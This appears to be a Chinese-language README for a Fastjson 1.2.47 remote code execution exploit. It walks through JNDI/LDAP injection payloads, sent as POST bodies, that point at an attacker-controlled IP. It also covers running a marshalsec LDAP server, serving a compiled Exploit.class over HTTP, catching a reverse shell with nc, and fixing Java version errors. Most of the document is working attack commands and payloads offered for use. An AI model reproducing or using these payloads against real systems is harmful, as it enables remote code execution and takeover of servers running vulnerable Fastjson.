# fastjson-1.2.47-RCE
Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法，以及避开坑点

以下操作均在Ubuntu 18下亲测可用，openjdk需要切换到8，且使用8的javac
```
> java -version
openjdk versin "1.8.0_222"

> javac -version
javac 1.8.0_222
```

### 0x00 假设存在漏洞的功能

```
POST /note/submit/

param={'id':29384,'content':'Hello','type':'string'}
```

### 0x01 测试外连

准备一台服务器监听流量
```
nc -lvvp 7777
```

发送Payload，将IP改为监听服务器IP
```
POST /note/submit/

param={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:7777/Exploit","autoCommit":true}}}
```

如果监听服务器有流量，可以继续下一步

### 0x02 准备LDAP服务和Web服务

将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下

在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit
```

在当前目录下运行Web服务
```
python3 -m http.server 80 或者 python -m SimpleHTTPServer 80
```

### 0x03 修改Exploit并编译成class文件

修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）

使用javac编译Exploit.java，生成Exploit.class文件（注意：javac最好与目标服务器接近，否则目标服务器无法解析class文件，会报错）
```
javac Exploit.java
```

### 0x03 准备

回顾一下，现在目录应该有三个文件
```
marshalsec-0.0.3-SNAPSHOT-all.jar
Exploit.java
Exploit.class
```

服务器正在开启LDAP和Web
```
LDAP Server：Listening on 0.0.0.0:1389
Web  Server：Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

一个nc正在准备接收反弹回来的SHELL
```
nc -lvvp 7777
```

### 0x04 执行
修改ip为正在运行LDAP和Web服务的服务器IP
```
POST /note/submit

param={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1389/Exploit","autoCommit":true}}}
```

接下来如果没有任何报错的话，LDAP将会把请求Redirect到Web服务，Fastjson将会下载Exploit.class，并解析运行

你的LDAP服务和Web服务都会收到请求记录，如果没有问题，你的nc也会收到反弹回来的SHELL

### 0x05 问题

当javac版本和目标服务器差太多，会报一个这样得到错误，所以需要使用1.8的javac来编译Exploit.java
```
Caused by: java.lang.UnsupportedClassVersionError: Exploit has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
```

当运行LDAP的服务器java版本过高，会无法运行LDAP服务，虽然显示正在Listening，但是Fastjson的JNDI会报错，显示无法获取到资源，所以要使用java 1.8（openjdk 8）来运行LDAP服务